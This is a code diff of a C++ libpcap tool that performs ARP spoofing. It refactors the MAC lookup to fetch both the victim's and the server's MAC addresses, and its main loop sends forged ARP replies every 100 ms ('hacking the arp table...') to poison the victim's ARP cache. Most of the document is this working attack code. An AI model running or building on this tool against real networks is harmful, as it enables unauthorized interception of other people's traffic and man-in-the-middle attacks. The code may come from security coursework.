@@ -7,6 +7,8 @@
 #include <sys/socket.h>
 #include <errno.h>
 #include <stdlib.h>
+#include <unistd.h>
+#include <thread>
 
 #include <pcap.h>
 #include <netinet/ip.h>
@@ -20,10 +22,12 @@
 
 using namespace std;
 
+void sendARP(pcap_t* pcd, uint8_t arp_packet);
+
 void atoiIP(char* addr, uint8_t* ip);
 void printMAC(uint8_t* add, int length);
 int getAttackerMAC(uint8_t* attacker_mac, char* device);
-void getVictimMAC(uint8_t* victim_ip, uint8_t* victim_mac);
+void getMAC(uint8_t* victim_ip, uint8_t* victim_mac);
 void makeEther(struct ether_header* ether, uint8_t* attacker_mac, uint8_t* victim_mac);
 void makeArp(struct ether_arp* arp, uint8_t* server_ip, uint8_t* victim_ip, uint8_t* attacker_mac, uint8_t* victim_mac);
 
@@ -33,8 +37,8 @@ int main(int argc, char* argv[]) {
   char err_buf[PCAP_ERRBUF_SIZE];
   pcap_t *pcd;
 
-  char* device = argv[1];
   // cout << device << endl;
+  char* device = argv[1];
 
   // Change the mac address of this ip address(sourceIP) to your mac address.
   uint8_t server_ip[4];
@@ -48,9 +52,13 @@ int main(int argc, char* argv[]) {
   uint8_t attacker_mac[6];
   getAttackerMAC(attacker_mac, device);
 
-  // is really need targetmac? (victim's MAC) -> YES
+  // get the victim mac
   uint8_t victim_mac[6];
-  getVictimMAC(victim_ip, victim_mac);
+  getMAC(victim_ip, victim_mac);
+
+  // get the server mac
+  uint8_t server_mac[6];
+  getMAC(server_ip, server_mac);
 
   // allocate as much as the header size
   struct ether_header ether;
@@ -71,21 +79,19 @@ int main(int argc, char* argv[]) {
   makeArp(&arp, server_ip, victim_ip, attacker_mac, victim_mac);
 
   // allocate as much as the packet size
-  uint8_t packet[42];
-  memset(packet, 0, sizeof(packet));
+  uint8_t arp_packet[42];
+  memset(arp_packet, 0, sizeof(arp_packet));
 
   // copy the ethernet and arp header
-  memcpy(&packet, &ether, sizeof(ether));
-  memcpy(packet+sizeof(ether), &arp, sizeof(arp));
+  memcpy(&arp_packet, &ether, sizeof(ether));
+  memcpy(arp_packet+sizeof(ether), &arp, sizeof(arp));
 
   // send the packet
   while(1) {
     cout << "hacking the arp table..." << endl;
-    pcap_sendpacket(pcd, packet, sizeof(packet));
+    pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));
     usleep(100000);
   }
-
-  return 0;
 }
 
 void atoiIP(char* ch_ip, uint8_t* num_ip) {
@@ -126,12 +132,11 @@ int getAttackerMAC(uint8_t* attacker_mac, char* device) {
     close(s);
 }
 
-void getVictimMAC(uint8_t* victim_ip, uint8_t* victim_mac) {
+void getMAC(uint8_t* ip, uint8_t* mac) {
     char fbuffer[18], ch_ip[20];
-    char* ch_mac[6];
     int i = 0;
 
-    sprintf(ch_ip, "%d.%d.%d.%d", victim_ip[0], victim_ip[1], victim_ip[2], victim_ip[3]);
+    sprintf(ch_ip, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
 
     char system_call[50];
     sprintf(system_call, "arp -a %s | cut -f 4 -d \" \" > mac.txt", ch_ip);
@@ -142,7 +147,7 @@ void getVictimMAC(uint8_t* victim_ip, uint8_t* victim_mac) {
 
     char* temp = strtok(fbuffer, ":");
     while (temp != NULL) {
-      victim_mac[i] = strtol(temp, NULL, 16);
+      mac[i] = strtol(temp, NULL, 16);
       temp = strtok(NULL, ":");
       // printf("%02x\n", victim_mac[i]);
       i++;
